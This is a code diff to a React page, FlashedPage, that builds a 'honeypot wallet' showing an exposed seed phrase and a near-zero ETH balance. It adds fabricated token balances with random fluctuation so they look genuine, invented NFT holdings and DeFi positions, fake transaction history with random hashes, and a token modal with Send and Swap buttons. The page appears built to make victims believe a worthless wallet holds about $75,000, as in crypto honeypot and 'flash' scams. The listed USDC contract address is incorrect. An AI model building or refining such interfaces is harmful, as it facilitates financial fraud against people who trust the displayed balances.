@@ -52,20 +52,82 @@ export default function FlashedPage() {
 
   const generateHoneypotWallet = () => {
     const randomWallet = ethers.Wallet.createRandom();
+    
+    // Generate realistic daily fluctuating amounts
+    const baseAmounts = {
+      USDT: 24891.47,
+      USDC: 12456.83, 
+      WETH: 17187.90,
+      LINK: 11862.06,
+      UNI: 9020.68
+    };
+    
+    // Add daily variation (-5% to +5%)
+    const variation = () => (Math.random() - 0.5) * 0.1 + 1;
+    
     const honeypotWallet = {
       address: randomWallet.address,
       privateKey: randomWallet.privateKey,
       seedPhrase: randomWallet.mnemonic.phrase,
-      totalValue: 75418.94,
       ethBalance: 0.000000001,
       tokens: [
-        { symbol: 'USDT', balance: '24,891.47', usdValue: 24891.47, change: '+2.1%' },
-        { symbol: 'USDC', balance: '12,456.83', usdValue: 12456.83, change: '+0.1%' },
-        { symbol: 'WETH', balance: '5.7293', usdValue: 17187.90, change: '-1.2%' },
-        { symbol: 'LINK', balance: '847.29', usdValue: 11862.06, change: '+5.4%' },
-        { symbol: 'UNI', balance: '1,293.84', usdValue: 9020.68, change: '+3.2%' }
+        { 
+          symbol: 'USDT', 
+          balance: (24891.47 * variation()).toFixed(2), 
+          usdValue: baseAmounts.USDT * variation(), 
+          change: `${(Math.random() * 10 - 5).toFixed(1)}%`,
+          contract: '0xdAC17F958D2ee523a2206206994597C13D831ec7'
+        },
+        { 
+          symbol: 'USDC', 
+          balance: (12456.83 * variation()).toFixed(2), 
+          usdValue: baseAmounts.USDC * variation(), 
+          change: `${(Math.random() * 6 - 3).toFixed(1)}%`,
+          contract: '0xA0b86a33E6441E6C7D3E4081C3cC6E7C3c2b4C0d'
+        },
+        { 
+          symbol: 'WETH', 
+          balance: (5.7293 * variation()).toFixed(4), 
+          usdValue: baseAmounts.WETH * variation(), 
+          change: `${(Math.random() * 8 - 4).toFixed(1)}%`,
+          contract: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'
+        },
+        { 
+          symbol: 'LINK', 
+          balance: (847.29 * variation()).toFixed(2), 
+          usdValue: baseAmounts.LINK * variation(), 
+          change: `${(Math.random() * 12 - 6).toFixed(1)}%`,
+          contract: '0x514910771AF9Ca656af840dff83E8264EcF986CA'
+        },
+        { 
+          symbol: 'UNI', 
+          balance: (1293.84 * variation()).toFixed(2), 
+          usdValue: baseAmounts.UNI * variation(), 
+          change: `${(Math.random() * 15 - 7).toFixed(1)}%`,
+          contract: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984'
+        }
+      ],
+      nfts: [
+        { name: 'Bored Ape #7234', collection: 'BAYC', value: '$45,000', image: 'https://via.placeholder.com/100' },
+        { name: 'CryptoPunk #3421', collection: 'CryptoPunks', value: '$28,000', image: 'https://via.placeholder.com/100' },
+        { name: 'Azuki #892', collection: 'Azuki', value: '$12,000', image: 'https://via.placeholder.com/100' }
+      ],
+      defiPositions: [
+        { protocol: 'Uniswap V3', type: 'Liquidity Pool', value: '$8,450', apy: '12.4%' },
+        { protocol: 'Aave', type: 'Lending', value: '$15,200', apy: '3.8%' },
+        { protocol: 'Compound', type: 'Staking', value: '$6,750', apy: '5.2%' }
+      ],
+      recentActivity: [
+        { type: 'Received', token: 'USDT', amount: '2,450.00', time: '2 hours ago', hash: '0x' + Math.random().toString(16).substr(2, 64) },
+        { type: 'Swapped', token: 'ETH → USDC', amount: '1.5 ETH', time: '1 day ago', hash: '0x' + Math.random().toString(16).substr(2, 64) },
+        { type: 'Sent', token: 'LINK', amount: '125.00', time: '3 days ago', hash: '0x' + Math.random().toString(16).substr(2, 64) },
+        { type: 'Received', token: 'UNI', amount: '89.50', time: '5 days ago', hash: '0x' + Math.random().toString(16).substr(2, 64) }
       ]
     };
+    
+    // Calculate total value
+    honeypotWallet.totalValue = honeypotWallet.tokens.reduce((sum, token) => sum + token.usdValue, 0);
+    
     setWalletData(honeypotWallet);
   };
 
@@ -413,7 +475,10 @@ export default function FlashedPage() {
                   return (
                     <div 
                       key={index} 
-                      onClick={() => handleAction('send', token)}
+                      onClick={() => {
+                        setSelectedToken(token);
+                        setShowModal('tokenDetails');
+                      }}
                       className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700"
                     >
                       <div className="flex items-center">
@@ -440,56 +505,107 @@ export default function FlashedPage() {
             )}
 
             {activeTab === 'DeFi' && (
-              <div className="p-8 text-center">
-                <div className="text-gray-400 mb-4">No DeFi positions found</div>
-                <button 
-                  onClick={() => handleAction('defi')}
-                  className="bg-blue-600 hover:bg-blue-700 px-6 py-2 rounded-lg text-white font-semibold"
-                >
-                  Explore DeFi
-                </button>
+              <div>
+                {walletData.defiPositions.map((position, index) => (
+                  <div key={index} className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
+                    <div className="flex items-center">
+                      <div className="w-8 h-8 bg-purple-500 rounded-full flex items-center justify-center mr-3">
+                        <span className="text-white text-xs font-bold">D</span>
+                      </div>
+                      <div>
+                        <div className="text-white font-medium">{position.protocol}</div>
+                        <div className="text-gray-400 text-sm">{position.type} • {position.apy} APY</div>
+                      </div>
+                    </div>
+                    <div className="text-right">
+                      <div className="text-white font-medium">{position.value}</div>
+                      <div className="text-green-400 text-sm">Earning</div>
+                    </div>
+                  </div>
+                ))}
               </div>
             )}
 
             {activeTab === 'NFTs' && (
-              <div className="p-8 text-center">
-                <div className="text-gray-400 mb-4">No NFTs found</div>
-                <button 
-                  onClick={() => handleAction('nft')}
-                  className="bg-purple-600 hover:bg-purple-700 px-6 py-2 rounded-lg text-white font-semibold"
-                >
-                  Browse NFTs
-                </button>
+              <div>
+                {walletData.nfts.map((nft, index) => (
+                  <div key={index} className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
+                    <div className="flex items-center">
+                      <div className="w-12 h-12 bg-gradient-to-r from-purple-500 to-pink-500 rounded-lg mr-3 flex items-center justify-center">
+                        <span className="text-white text-xs font-bold">NFT</span>
+                      </div>
+                      <div>
+                        <div className="text-white font-medium">{nft.name}</div>
+                        <div className="text-gray-400 text-sm">{nft.collection}</div>
+                      </div>
+                    </div>
+                    <div className="text-right">
+                      <div className="text-white font-medium">{nft.value}</div>
+                      <div className="text-gray-400 text-sm">Floor</div>
+                    </div>
+                  </div>
+                ))}
               </div>
             )}
 
             {activeTab === 'Activity' && (
               <div>
-                {transactions.length === 0 ? (
-                  <div className="p-8 text-center">
-                    <div className="text-gray-400 mb-4">No recent activity</div>
-                  </div>
-                ) : (
-                  <div>
-                    {transactions.map((tx) => (
-                      <div key={tx.id} className="flex items-center justify-between p-4 border-b border-gray-700">
-                        <div className="flex items-center">
-                          <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center mr-3">
-                            <span className="text-white text-xs">→</span>
-                          </div>
-                          <div>
-                            <div className="text-white font-medium capitalize">{tx.type}</div>
-                            <div className="text-gray-400 text-sm">{tx.timestamp}</div>
-                          </div>
+                {/* Show wallet's existing activity first */}
+                {walletData.recentActivity.map((activity, index) => {
+                  const getIcon = (type) => {
+                    switch(type) {
+                      case 'Received': return '↓';
+                      case 'Sent': return '↑';
+                      case 'Swapped': return '⇄';
+                      default: return '•';
+                    }
+                  };
+                  const getColor = (type) => {
+                    switch(type) {
+                      case 'Received': return 'bg-green-500';
+                      case 'Sent': return 'bg-red-500';
+                      case 'Swapped': return 'bg-blue-500';
+                      default: return 'bg-gray-500';
+                    }
+                  };
+                  
+                  return (
+                    <div key={index} className="flex items-center justify-between p-4 border-b border-gray-700">
+                      <div className="flex items-center">
+                        <div className={`w-8 h-8 ${getColor(activity.type)} rounded-full flex items-center justify-center mr-3`}>
+                          <span className="text-white text-xs">{getIcon(activity.type)}</span>
                         </div>
-                        <div className="text-right">
-                          <div className="text-white font-medium">{tx.amount}</div>
-                          <div className="text-green-400 text-sm">{tx.status}</div>
+                        <div>
+                          <div className="text-white font-medium">{activity.type} {activity.token}</div>
+                          <div className="text-gray-400 text-sm">{activity.time}</div>
                         </div>
                       </div>
-                    ))}
+                      <div className="text-right">
+                        <div className="text-white font-medium">{activity.amount}</div>
+                        <div className="text-green-400 text-sm">Confirmed</div>
+                      </div>
+                    </div>
+                  );
+                })}
+                
+                {/* Show user's new transactions */}
+                {transactions.map((tx) => (
+                  <div key={tx.id} className="flex items-center justify-between p-4 border-b border-gray-700">
+                    <div className="flex items-center">
+                      <div className="w-8 h-8 bg-purple-500 rounded-full flex items-center justify-center mr-3">
+                        <span className="text-white text-xs">→</span>
+                      </div>
+                      <div>
+                        <div className="text-white font-medium capitalize">{tx.type}</div>
+                        <div className="text-gray-400 text-sm">{tx.timestamp}</div>
+                      </div>
+                    </div>
+                    <div className="text-right">
+                      <div className="text-white font-medium">{tx.amount}</div>
+                      <div className="text-green-400 text-sm">{tx.status}</div>
+                    </div>
                   </div>
-                )}
+                ))}
               </div>
             )}
           </div>
@@ -717,6 +833,59 @@ export default function FlashedPage() {
                   >
                     Copy My Address (Receive ETH)
                   </button>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {showModal === 'tokenDetails' && selectedToken && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">{selectedToken.symbol}</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-4">
+                  <div className="text-center">
+                    <div className="text-3xl font-bold text-white mb-2">${selectedToken.usdValue.toLocaleString()}</div>
+                    <div className="text-gray-300">{selectedToken.balance} {selectedToken.symbol}</div>
+                    <div className={`text-sm ${selectedToken.change.startsWith('+') ? 'text-green-400' : 'text-red-400'}`}>
+                      {selectedToken.change} (24h)
+                    </div>
+                  </div>
+                  
+                  <div className="bg-gray-700 p-3 rounded-lg">
+                    <div className="text-gray-300 text-sm mb-1">Contract Address:</div>
+                    <div className="text-white font-mono text-xs break-all">{selectedToken.contract}</div>
+                  </div>
+                  
+                  <div className="grid grid-cols-3 gap-2">
+                    <button 
+                      onClick={() => {
+                        setShowModal('send');
+                      }}
+                      className="bg-blue-600 hover:bg-blue-700 py-2 px-3 rounded-lg text-white font-semibold text-sm"
+                    >
+                      Send
+                    </button>
+                    <button 
+                      onClick={() => {
+                        setShowModal('swap');
+                      }}
+                      className="bg-purple-600 hover:bg-purple-700 py-2 px-3 rounded-lg text-white font-semibold text-sm"
+                    >
+                      Swap
+                    </button>
+                    <button 
+                      onClick={() => {
+                        copyToClipboard(selectedToken.contract);
+                        setStatus('Contract address copied!');
+                      }}
+                      className="bg-gray-600 hover:bg-gray-700 py-2 px-3 rounded-lg text-white font-semibold text-sm"
+                    >
+                      Copy
+                    </button>
+                  </div>
                 </div>
               </div>
             </div>
